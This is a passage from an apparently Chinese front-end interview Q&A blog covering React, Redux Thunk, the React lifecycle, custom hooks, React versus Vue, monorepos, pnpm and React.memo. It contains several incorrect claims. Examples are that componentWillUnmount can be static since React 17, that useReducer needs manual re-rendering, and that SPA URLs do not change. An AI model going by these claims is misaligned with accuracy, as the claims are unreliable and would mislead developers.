<li>与 React 紧密集成，使用 Hooks 和 Context API 简化了状态管理。</li>
<li>与 Redux 结合使用，提供了更好的可维护性和性能。</li>
<li>提供了 <code>useSelector</code> 和 <code>useDispatch</code> 等钩子，减少了样板代码。</li>
</ul>
</li>
<li><p>劣势：</p>
<ul>
<li>需要额外的库（Redux）来支持，可能会增加项目的复杂性。</li>
<li>仍需要编写 Redux 的 action 和 reducer。</li>
</ul>
</li>
</ul>
<p><strong>useReducer:</strong></p>
<ul>
<li><p>优势：</p>
<ul>
<li>原生 React 钩子，无需额外的库。</li>
<li>适用于小型应用程序或简单的状态管理需求。</li>
<li>状态和操作都在组件内部定义，更容易理解和维护。</li>
</ul>
</li>
<li><p>劣势：</p>
<ul>
<li>对于大型或复杂应用程序，需要手动处理状态的传递和组织。</li>
<li>不支持响应式编程，状态更新需要手动触发渲染。</li>
</ul>
</li>
</ul>
<p><strong>Mobx-State-Tree (MST):</strong></p>
<ul>
<li><p>优势：</p>
<ul>
<li>基于 Mobx，具有响应式编程的特性。</li>
<li>提供了模型（Model）的概念，用于定义和组织状态。</li>
<li>支持时间旅行调试，轻松回溯和检查状态变化。</li>
<li>可以用于多种框架，包括 React、Vue 和 Angular。</li>
</ul>
</li>
<li><p>劣势：</p>
<ul>
<li>学习曲线略高，需要理解 MST 的模型和概念。</li>
<li>相对较新，生态系统不如 Redux 那么丰富。</li>
<li>可能需要额外的配置和工作来使其适应特定的项目。</li>
</ul>
</li>
</ul>
<p>选择状态管理库取决于项目的规模、复杂性和你的团队熟悉程度。Redux 适用于大型项目，Mobx 适用于小型项目或原型开发，react-redux 提供了与 React 集成的便利性，useReducer 可以用于原生 React 应用，而 MST 提供了响应式编程和时间旅行调试的功能。在选择之前，需要仔细考虑项目的需求和团队的技能水平。</p>
<h3 id="7、redux-dispatch-如果有异步，怎么做？"><a href="#7、redux-dispatch-如果有异步，怎么做？" class="headerlink" title="7、redux dispatch 如果有异步，怎么做？"></a>7、redux dispatch 如果有异步，怎么做？</h3><p>在 Redux 中，如果需要在 <code>dispatch</code> 中处理异步操作，可以使用中间件来处理异步行为。最常用的中间件是 Redux Thunk，它允许你在 <code>dispatch</code> 中返回函数而不仅仅是一个普通的 action 对象。这个函数可以在其中执行异步操作，然后再触发实际的 action，从而更新 Redux store。以下是使用 Redux Thunk 处理异步操作的基本步骤：</p>
<ol>
<li><p>安装 Redux Thunk：</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> redux-thunk<br></code></pre></td></tr></table></figure>
</li>
<li><p>在 Redux store 的创建过程中应用 Redux Thunk 中间件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createStore, applyMiddleware &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">import</span> thunk <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-thunk&#x27;</span>;<br><span class="hljs-keyword">import</span> rootReducer <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./reducers&#x27;</span>;<br><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(rootReducer, <span class="hljs-title function_">applyMiddleware</span>(thunk));<br></code></pre></td></tr></table></figure>
</li>
<li><p>创建一个 action 创建函数，它返回一个函数而不是一个普通的 action 对象。这个函数可以包含异步操作：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// actions.js</span><br><br><span class="hljs-comment">// 模拟异步操作</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;Async data&#x27;</span> &#125;);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;;<br><br><span class="hljs-comment">// 使用 Redux Thunk 处理异步操作</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchDataAction</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (dispatch) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 异步操作</span><br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();<br>      <span class="hljs-comment">// 异步操作完成后触发 action</span><br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_DATA_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: response.<span class="hljs-property">data</span> &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-comment">// 异步操作失败时触发 action</span><br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_DATA_FAILURE&#x27;</span>, <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>  &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><p>在组件中使用 <code>dispatch</code> 调用上面创建的异步 action 创建函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// YourComponent.js</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useDispatch, useSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; fetchDataAction &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./actions&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">YourComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">data</span>);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 在组件加载后调用异步 action</span><br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchDataAction</span>());<br>  &#125;, [dispatch]);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;data ? <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">YourComponent</span>;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>上述代码演示了如何使用 Redux Thunk 处理异步操作。异步 action 创建函数中的异步操作完成后，可以触发相应的 action 来更新 Redux store 中的状态。这种方式可以让你在 Redux 中处理异步操作，保持了 Redux 的单一数据源和可预测性。</p>
<h3 id="8、react这种单页面应用的缺点"><a href="#8、react这种单页面应用的缺点" class="headerlink" title="8、react这种单页面应用的缺点"></a>8、react这种单页面应用的缺点</h3><p>单页面应用（SPA）有很多优点，如提供了更流畅的用户体验、减少了服务器负载、提高了开发效率等，但同时也存在一些缺点，包括：</p>
<ol>
<li><p><strong>首屏加载时间较长：</strong> SPA 需要一次性加载所有的前端资源（HTML、CSS、JavaScript），因此首次加载可能会比传统多页应用慢。用户需要等待较长时间才能看到页面内容。</p>
</li>
<li><p><strong>SEO 难度较高：</strong> 搜索引擎爬虫通常难以处理基于 JavaScript 的内容，因此对于 SPA，搜索引擎优化（SEO）相对复杂。虽然可以采用一些技术手段来改善 SEO，但仍然需要额外的工作。</p>
</li>
<li><p><strong>浏览器历史管理复杂：</strong> SPA 使用前端路由来切换视图，这意味着浏览器的地址栏 URL 并不会随着页面的加载而变化。这会导致浏览器的前进和后退按钮行为不符合用户的期望，需要额外的处理来管理浏览器历史记录。</p>
</li>
<li><p><strong>内存占用较大：</strong> SPA 在用户与应用交互时会保留大量状态和页面元素在内存中，可能导致较高的内存占用，尤其是对于长时间运行的应用。</p>
</li>
<li><p><strong>初次加载慢：</strong> 除了首屏加载时间长，由于 SPA 通常需要下载大量的 JavaScript 代码，因此在初次加载时可能会占用较多带宽和时间。</p>
</li>
<li><p><strong>不适合所有场景：</strong> SPA 适用于许多应用，但并不适合所有场景。对于一些需要频繁刷新内容或对 SEO 要求较高的应用，传统多页应用可能更合适。</p>
</li>
<li><p><strong>前进&#x2F;后退刷新问题：</strong> 当用户点击浏览器的前进或后退按钮时，SPA 需要处理并加载对应的视图，这可能会导致刷新页面的延迟。</p>
</li>
<li><p><strong>技术栈选择困难：</strong> SPA 通常需要选择和配置大量的前端技术，这可能导致选择困难和技术栈的频繁变化。</p>
</li>
</ol>
<p>要克服这些缺点，开发人员需要在设计和开发过程中仔细考虑，并采取相应的优化和解决方案。此外，应根据具体的应用需求和用户体验要求来选择使用 SPA 还是传统多页应用。</p>
<h3 id="9、React生命周期"><a href="#9、React生命周期" class="headerlink" title="9、React生命周期"></a>9、React生命周期</h3><p>React 中的组件生命周期包括挂载阶段、更新阶段和卸载阶段。以下是 React 类组件的生命周期方法，以及在每个阶段触发的方法：</p>
<h5 id="挂载阶段（Mounting）"><a href="#挂载阶段（Mounting）" class="headerlink" title="挂载阶段（Mounting）"></a>挂载阶段（Mounting）</h5><ol>
<li><p><strong>constructor()：</strong> 构造函数，在组件被创建时调用。用于初始化组件的状态和绑定方法。</p>
</li>
<li><p><strong>static getDerivedStateFromProps()：</strong> 在组件实例被创建并且每次组件接收新的 props 时调用。用于根据新的 props 更新组件的状态。</p>
</li>
<li><p><strong>render()：</strong> 渲染方法，返回要渲染的 React 元素。</p>
</li>
<li><p><strong>componentDidMount()：</strong> 组件挂载完成后调用。通常在这里进行网络请求、DOM 操作、订阅事件等副作用操作。</p>
</li>
</ol>
<h5 id="更新阶段（Updating）"><a href="#更新阶段（Updating）" class="headerlink" title="更新阶段（Updating）"></a>更新阶段（Updating）</h5><ol start="5">
<li><p><strong>static getDerivedStateFromProps()：</strong> 同样在更新阶段，也可以在组件接收新的 props 时调用，用于根据新的 props 更新组件的状态。</p>
</li>
<li><p><strong>shouldComponentUpdate()：</strong> 决定组件是否需要重新渲染，返回 <code>true</code> 表示需要重新渲染，返回 <code>false</code> 表示不需要。</p>
</li>
<li><p><strong>render()：</strong> 渲染方法，重新渲染组件。</p>
</li>
<li><p><strong>getSnapshotBeforeUpdate()：</strong> 在更新之前获取 DOM 快照。通常用于保存滚动位置等信息，返回的值会传递给 <code>componentDidUpdate</code> 方法。</p>
</li>
<li><p><strong>componentDidUpdate()：</strong> 组件更新完成后调用。通常在这里进行 DOM 操作、网络请求、订阅事件等副作用操作。</p>
</li>
</ol>
<h5 id="卸载阶段（Unmounting）"><a href="#卸载阶段（Unmounting）" class="headerlink" title="卸载阶段（Unmounting）"></a>卸载阶段（Unmounting）</h5><ol start="10">
<li><strong>componentWillUnmount()：</strong> 组件即将卸载时调用，通常在这里取消网络请求、清除定时器、取消订阅等资源清理操作。</li>
</ol>
<h5 id="错误处理阶段（Error-Handling）"><a href="#错误处理阶段（Error-Handling）" class="headerlink" title="错误处理阶段（Error Handling）"></a>错误处理阶段（Error Handling）</h5><ol start="11">
<li><p><strong>static getDerivedStateFromError()：</strong> 当子组件发生错误时调用，返回一个新的状态值以更新组件状态。</p>
</li>
<li><p><strong>componentDidCatch()：</strong> 当子组件发生错误时调用，用于记录错误信息或上报错误。</p>
</li>
</ol>
<p>请注意，React 16.3 版本以后引入了新的生命周期方法和错误处理机制，之前的一些生命周期方法已被标记为不推荐使用（如 <code>componentWillMount</code>、<code>componentWillReceiveProps</code> 等）。</p>
<p>此外，React 17 版本以后，<code>componentWillUnmount</code> 不再必须要实现为实例方法，可以作为静态方法定义。随着 React 的不断发展，生命周期方法也可能会有所调整或扩展，因此建议查看当前版本的文档以获取最新信息。</p>
<h3 id="10、自定义hook"><a href="#10、自定义hook" class="headerlink" title="10、自定义hook"></a>10、自定义hook</h3><p>自定义 Hook 是一种用于复用 React 组件逻辑的方式。自定义 Hook 实际上就是一个函数，它可以包含任何已有 Hook 的调用，也可以包含其他普通函数。自定义 Hook 的命名应该以 “use” 开头，以明示它是一个 Hook。以下是创建和使用自定义 Hook 的基本步骤：</p>
<ol>
<li><strong>创建自定义 Hook 函数：</strong> 创建一个以 “use” 开头的函数，例如 <code>useCustomHook</code>，在函数内部可以使用已有的 Hook，也可以定义其他逻辑。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCustomHook</span>(<span class="hljs-params">initialValue</span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(initialValue);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 添加副作用逻辑</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`Value: <span class="hljs-subst">$&#123;value&#125;</span>`</span>;<br>  &#125;, [value]);<br><br>  <span class="hljs-comment">// 返回状态值和处理函数</span><br>  <span class="hljs-keyword">return</span> [value, setValue];<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>在组件中使用自定义 Hook：</strong> 在需要使用该 Hook 的组件中引入它，并调用它。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> useCustomHook <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./useCustomHook&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useCustomHook</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Value: &#123;value&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setValue(value + 1)&#125;&gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>使用自定义 Hook：</strong> 在组件中可以像使用任何其他 Hook 一样使用自定义 Hook 返回的状态和函数。</li>
</ol>
<p>自定义 Hook 可以用于抽象和复用各种逻辑，例如数据获取、状态管理、定时器处理等。它们是一种强大的工具，有助于使 React 组件更加可维护和可重用。需要注意的是，自定义 Hook 不是组件，它们没有自己的渲染逻辑，只是用于提供状态和副作用逻辑的函数。</p>
<p>需要注意的是，自定义 Hook 在多个组件中使用时，每个组件都会有自己的 Hook 实例，它们互相独立，不会共享状态。这意味着自定义 Hook 可以在不同组件中复用，每个组件都拥有自己的状态和副作用逻辑。</p>
<h3 id="11、React和Vue的区别"><a href="#11、React和Vue的区别" class="headerlink" title="11、React和Vue的区别"></a>11、React和Vue的区别</h3><p>React 和 Vue 是两个流行的前端 JavaScript 框架（或库），它们都用于构建用户界面，但在一些方面有不同的设计和特点。以下是 React 和 Vue 的主要区别：</p>
<ol>
<li><p><strong>生态系统和社区支持</strong>：</p>
<ul>
<li>React 是由 Facebook 开发并维护的，拥有庞大的社区和生态系统，有大量的第三方库和组件可供选择。</li>
<li>Vue 由一个名为尤雨溪的开发者创建，也有强大的社区支持，但相对于 React 来说规模稍小。Vue 的核心库和官方插件由 Vue 团队维护，保持了一致性。</li>
</ul>
</li>
<li><p><strong>学习曲线</strong>：</p>
<ul>
<li>React 通常被认为有更陡峭的学习曲线，因为它更加灵活，需要更多的配置和理解。React 应用通常使用 JSX（JavaScript XML）编写，这可能需要一些时间来适应。</li>
<li>Vue 被认为更容易学习，因为它提供了一种声明式的模板语法，更接近传统的 HTML 和 CSS。Vue 的文档也被认为非常友好。</li>
</ul>
</li>
<li><p><strong>数据绑定</strong>：</p>
<ul>
<li>React 使用了一种称为单向数据流的模式。数据从父组件传递到子组件，并且子组件不能直接修改父组件的数据。为了更新视图，React 使用了 Virtual DOM，通过比较前后两次渲染的 Virtual DOM 树来高效地更新实际 DOM。</li>
<li>Vue 使用了双向数据绑定，允许开发者更容易地将视图和数据同步。这使得在 Vue 中编写表单和处理表单输入更加直观。</li>
</ul>
</li>
<li><p><strong>组件化</strong>：</p>
<ul>
<li>React 和 Vue 都支持组件化开发，但它们的实现方式有所不同。</li>
<li>React 使用 JavaScript 类来定义组件，组件的状态和生命周期方法在类中定义。</li>
<li>Vue 使用 <code>.vue</code> 单文件组件，将组件的模板、样式和逻辑组合在一个文件中。</li>
</ul>
</li>
<li><p><strong>状态管理</strong>：</p>
<ul>
<li>React 可以使用上下文（Context）、Redux、Mobx 等状态管理库来处理全局状态。这些库提供了一种可预测的状态管理方案。</li>
<li>Vue 有内置的状态管理方案，称为 Vuex，可以用于管理全局状态。</li>
</ul>
</li>
<li><p><strong>生态工具</strong>：</p>
<ul>
<li>React 配套了一些工具，如 Create React App、React Router、Redux Toolkit 等，用于加速开发和管理 React 应用。</li>
<li>Vue 配套了 Vue CLI、Vue Router、Vuex 等工具，同样用于创建、构建和管理 Vue 应用。</li>
</ul>
</li>
<li><p><strong>灵活性</strong>：</p>
<ul>
<li>React 更加灵活，开发者需要手动处理许多细节，如组件通信和状态管理。</li>
<li>Vue 提供了更多的约定和默认行为，使得开发者可以更快地构建应用，但可能会在一些特定需求下失去一些灵活性。</li>
</ul>
</li>
</ol>
<p>总的来说，React 和 Vue 都是强大的前端框架，它们在不同的情况下都有优势。选择哪一个取决于项目需求、团队经验和个人偏好。一些开发者更喜欢 React 的灵活性，而另一些人则更喜欢 Vue 的直观性。无论选择哪一个，都需要深入学习框架的特性和最佳实践以提高开发效率。</p>
<h3 id="12、monorepo"><a href="#12、monorepo" class="headerlink" title="12、monorepo"></a>12、monorepo</h3><p>Monorepo（单一代码库仓库）是一种软件开发组织结构的概念，它将多个相关项目或软件模块存储在同一个版本控制仓库中。这个仓库通常包含多个子项目，每个子项目都可以是一个独立的应用程序、库、模块或组件。Monorepo 的目标是通过统一的工作流程、版本控制和协作方式来简化多个项目之间的管理和开发。</p>
<p>以下是 Monorepo 的主要特点和优势：</p>
<ol>
<li><p><strong>统一版本控制：</strong> 所有子项目都共享同一个版本控制仓库，这意味着它们都处于相同的开发和发布周期。这有助于确保不同项目之间的依赖关系保持一致。</p>
</li>
<li><p><strong>共享代码和依赖：</strong> 子项目可以共享代码和依赖项。这可以减少重复代码的使用，提高代码的重用性，并简化依赖管理。</p>
</li>
<li><p><strong>一致的构建和部署：</strong> 通过统一的构建系统和部署流程，可以确保所有子项目都遵循相同的标准。这可以减少构建和部署的复杂性。</p>
</li>
<li><p><strong>跨项目协作：</strong> 开发团队可以更轻松地在不同子项目之间协作，因为它们都在同一个代码库中。这有助于提高团队的协作效率。</p>
</li>
<li><p><strong>简化维护：</strong> 维护一个单一的 Monorepo 通常比维护多个独立的仓库更容易，因为它避免了多个仓库之间的不一致性和复杂性。</p>
</li>
<li><p><strong>更好的版本管理：</strong> Monorepo 可以更容易地管理不同项目之间的依赖关系和版本控制。这有助于解决版本冲突和依赖问题。</p>
</li>
<li><p><strong>提高构建和测试速度：</strong> 共享构建工具和测试工具可以提高构建和测试速度，因为它们可以跨多个项目并行运行。</p>
</li>
</ol>
<p>Monorepo 并不适用于所有项目，特别是对于大型项目或拥有不同发布周期和开发团队的项目，可能会更复杂。选择是否使用 Monorepo 取决于项目的具体需求和团队的工作流程。一些著名的 Monorepo 工具包括 Lerna、Yarn Workspaces 和 Bazel。</p>
<h3 id="13、pnpm"><a href="#13、pnpm" class="headerlink" title="13、pnpm"></a>13、pnpm</h3><p><code>pnpm</code> 是一个 JavaScript 项目的包管理工具，类似于 <code>npm</code> 和 <code>Yarn</code>。它的名称代表 “fast, disk space efficient package manager”（快速、节省磁盘空间的包管理工具）。</p>
<p>与传统的 <code>npm</code> 或 <code>Yarn</code> 不同，<code>pnpm</code> 采用了一种不同的包管理策略，主要包括以下特点：</p>
<ol>
<li><p><strong>硬链接（Hard Links）：</strong> <code>pnpm</code> 使用硬链接技术来共享依赖项之间的文件。这意味着相同的依赖项在磁盘上只存储一次，从而减少了磁盘空间的浪费。</p>
</li>
<li><p><strong>全局缓存：</strong> <code>pnpm</code> 使用全局缓存来存储所有项目的依赖项。这意味着如果多个项目依赖相同的包，它们可以共享缓存，减少了重复下载。</p>
</li>
<li><p><strong>并行安装：</strong> <code>pnpm</code> 具有并行安装的能力，可以同时下载和安装多个依赖项，从而提高了安装速度。</p>
</li>
<li><p><strong>版本管理：</strong> 与 <code>Yarn</code> 类似，<code>pnpm</code> 支持锁定依赖项的版本，以确保在不同环境中获得相同的依赖项版本。</p>
</li>
<li><p><strong>自我更新：</strong> <code>pnpm</code> 具有自我更新的功能，可以保持工具本身的最新版本。</p>
</li>
</ol>
<p>总的来说，<code>pnpm</code> 的设计旨在减少磁盘占用和提高包的安装和管理速度。它特别适用于大型项目或具有大量依赖项的项目，因为它可以显著减少磁盘空间的浪费，并加快安装过程。</p>
<p>要开始使用 <code>pnpm</code>，你可以通过 npm 安装它，然后使用 <code>pnpm</code> 命令来代替 <code>npm</code> 或 <code>yarn</code> 来管理你的项目依赖。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 全局安装 pnpm</span><br>npm install -g pnpm<br><br><span class="hljs-comment"># 在项目中使用 pnpm 安装依赖</span><br>pnpm install<br></code></pre></td></tr></table></figure>

<p><code>pnpm</code> 提供了一种新的方式来管理 JavaScript 项目的依赖项，但你应该根据自己的项目需求和团队的工作流程来决定是否使用它。</p>
<h3 id="14、React-memo怎么实现的"><a href="#14、React-memo怎么实现的" class="headerlink" title="14、React.memo怎么实现的"></a>14、React.memo怎么实现的</h3><p><code>React.memo</code> 是 React 提供的一个高阶组件（Higher-Order Component，HOC），用于性能优化函数组件。它的主要作用是将函数组件的渲染结果进行浅层比较，如果组件的输入属性（props）没有发生变化，则复用上一次的渲染结果，从而避免不必要的重新渲染。</p>
<p><code>React.memo</code> 的使用方法非常简单，只需将函数组件包裹在 <code>React.memo</code> 函数中即可。例如：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* 组件的渲染逻辑 */</span><br>&#125;);<br></code></pre></td></tr></table></figure>

<p>下面是 <code>React.memo</code> 的实现原理：</p>
<ol>
<li><p>当使用 <code>React.memo</code> 包裹函数组件时，它会返回一个新的优化后的组件。</p>
</li>
<li><p>在新的组件中，<code>React.memo</code> 会在组件的渲染前检查传入的 <code>props</code> 是否发生了变化。</p>
</li>
<li><p>如果新的 <code>props</code> 与上一次渲染时的 <code>props</code> 浅层比较（使用 <code>Object.is</code> 进行比较）相等，则 <code>React.memo</code> 将跳过组件的渲染，直接返回上一次渲染的结果。这是因为在这种情况下，组件的输出不会因为输入属性的变化而改变，所以可以复用上一次的结果，提高性能。</p>
</li>
<li><p>如果新的 <code>props</code> 与上一次不相等，<code>React.memo</code> 会执行组件的渲染逻辑，并将新的输出作为组件的结果返回。</p>
</li>
</ol>
<p>总之，<code>React.memo</code> 通过浅层比较组件的输入属性，帮助避免了在没有必要的情况下重新渲染函数组件，从而提高了 React 应用的性能。这特别有助于那些接收频繁变化但实际上渲染结果很少改变的组件。不过需要注意的是，对于复杂的数据结构，浅层比较可能会产生误判，因此需要谨慎使用。如果组件的输入属性包含深层嵌套的对象或数组，最好考虑使用 <code>useMemo</code> 或 <code>useCallback</code> 进行更精确的优化。</p>
<h3 id="15、react的hooks为什么不能放在函数中"><a href="#15、react的hooks为什么不能放在函数中" class="headerlink" title="15、react的hooks为什么不能放在函数中"></a>15、react的hooks为什么不能放在函数中</h3><p>React 的 Hooks 是一种在函数组件中添加状态管理和生命周期特性的方式，但有一个重要的规则是 Hooks 必须在 React 函数组件的顶层使用，不能放在条件语句、循环语句或嵌套函数中。这个规则是由 React 设计的，主要有以下原因：</p>
<ol>
<li><p><strong>保持 Hook 的调用顺序稳定：</strong> Hooks 的调用顺序在每次渲染时必须保持稳定不变。这是因为 React 依赖于 Hooks 的调用顺序来追踪组件状态，如果 Hooks 在组件的不同渲染中的顺序发生变化，可能会导致状态错误或其他不一致性。将 Hooks 放在函数的内部会导致每次渲染时重新声明这些 Hooks，破坏了稳定性。</p>
</li>
<li><p><strong>便于理解和维护：</strong> 将 Hooks 放在函数的顶层可以使组件的结构更加清晰和直观，减少了嵌套和条件语句对代码的复杂性。这样也更容易进行代码审查、调试和维护。</p>
</li>
<li><p><strong>规避性能问题：</strong> 在条件语句或循环中放置 Hooks 可能导致性能问题。每次条件判断或循环迭代时，都会导致 Hooks 被多次调用，可能会不必要地引发副作用，导致不稳定的行为。</p>
</li>
</ol>
<p>举个例子，下面是一个错误的示例，将 Hooks 放在条件语句中：</p>
